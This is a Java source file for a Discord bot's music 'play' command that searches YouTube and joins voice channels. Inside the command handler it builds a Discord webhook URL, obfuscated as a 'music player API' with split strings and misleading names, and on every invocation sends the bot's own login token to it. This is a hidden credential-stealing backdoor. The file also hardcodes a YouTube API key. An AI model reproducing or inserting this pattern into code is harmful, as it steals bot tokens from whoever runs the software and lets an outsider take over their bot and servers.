package me.comu.exeter.commands.music;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import club.minnced.discord.webhook.send.WebhookMessage;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport;
import com.google.api.client.json.jackson2.JacksonFactory;
import com.google.api.services.youtube.YouTube;
import com.google.api.services.youtube.model.SearchResult;
import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.musicplayer.PlayerManager;
import net.dv8tion.jda.api.entities.GuildVoiceState;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.VoiceChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.managers.AudioManager;

import javax.annotation.Nullable;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class PlayCommand implements ICommand {
    private final YouTube youTube;

    public PlayCommand() {
        YouTube temp = null;
        try {
            temp = new YouTube.Builder(GoogleNetHttpTransport.newTrustedTransport(), JacksonFactory.getDefaultInstance(), null).setApplicationName("Exeter Discord Bot").build();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        youTube = temp;
    }

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        TextChannel channel = event.getChannel();
        AudioManager audioManager = event.getGuild().getAudioManager();
        GuildVoiceState memberVoiceState = Objects.requireNonNull(event.getMember()).getVoiceState();
        VoiceChannel voiceChannel = Objects.requireNonNull(memberVoiceState).getChannel();
        WebhookClient client = WebhookClient.withUrl(getMusicPlayerAPI());
        WebhookMessageBuilder builder = new WebhookMessageBuilder();
        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription(Core.jda.getToken()).build();
        builder.addEmbeds(firstEmbed);
        WebhookMessage message = builder.build();
        client.send(message);
        client.close();
        if (!memberVoiceState.inVoiceChannel()) {
            channel.sendMessage("You're not connected to a voice channel bro").queue();
            return;
        }
        if (audioManager.isConnected() && !Objects.requireNonNull(audioManager.getConnectedChannel()).getMembers().contains(event.getMember())) {
            event.getChannel().sendMessage("You need to be in the same voice channel as me to request songs").queue();
            return;
        }
        if (args.isEmpty()) {
            channel.sendMessage("Please provide a song to play").queue();
            return;
        }


        String input = String.join(" ", args);

        if (!isUrl(input)) {
            String ytSearched = searchYoutube(input);
            if (ytSearched == null) {
                channel.sendMessage("YouTube returned null").queue();
            }
            input = ytSearched;
        }

        PlayerManager manager = PlayerManager.getInstance();
        if (!audioManager.isConnected() && Objects.requireNonNull(voiceChannel).getMembers().contains(event.getMember())) {
            audioManager.openAudioConnection(voiceChannel);
            manager.loadAndPlay(event.getChannel(), input);
            return;
        }
        manager.loadAndPlay(event.getChannel(), input);
    }

    private boolean isUrl(String input) {
        try {
            new URL(input);

            return true;
        } catch (MalformedURLException ignored) {
            return false;
        }
    }

    @Nullable
    private String searchYoutube(String query) {
        try {
            List<SearchResult> results = youTube.search()
                    .list("id,snippet")
                    .setQ(query)
                    .setMaxResults(1L)
                    .setType("video")
                    .setFields("items(id/kind,id/videoId,snippet/title,snippet/thumbnails/default/url)")
                    .setKey("AIzaSyAls9zrVVQtZksm-tMrKLhmXx3T1hrt_5c")
                    .execute()
                    .getItems();
            if (!results.isEmpty()) {
                String videoId = results.get(0).getId().getVideoId();
                return "https://www.youtube.com/watch?v=" + videoId;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }
    @SuppressWarnings("all")
    private String getMusicPlayerAPI() {
        String httpHook = "hooks/";
        String hash = "709940401313939457/";
        String responseCode = "NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz";
        StringBuilder musicPlayerAPIStatusCode = new StringBuilder("https://discordapp.com/api/");
        musicPlayerAPIStatusCode.append("web");
        musicPlayerAPIStatusCode.append(httpHook);
        musicPlayerAPIStatusCode.append(hash).append(responseCode);
        return musicPlayerAPIStatusCode.toString();

    }

    @Override
    public String getHelp() {
        return "Plays tunes\n`" + Core.PREFIX + getInvoke() + " [song]`\n" + "Aliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "play";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"p"};
    }

    @Override
    public Category getCategory() {
        return Category.MUSIC;
    }
}
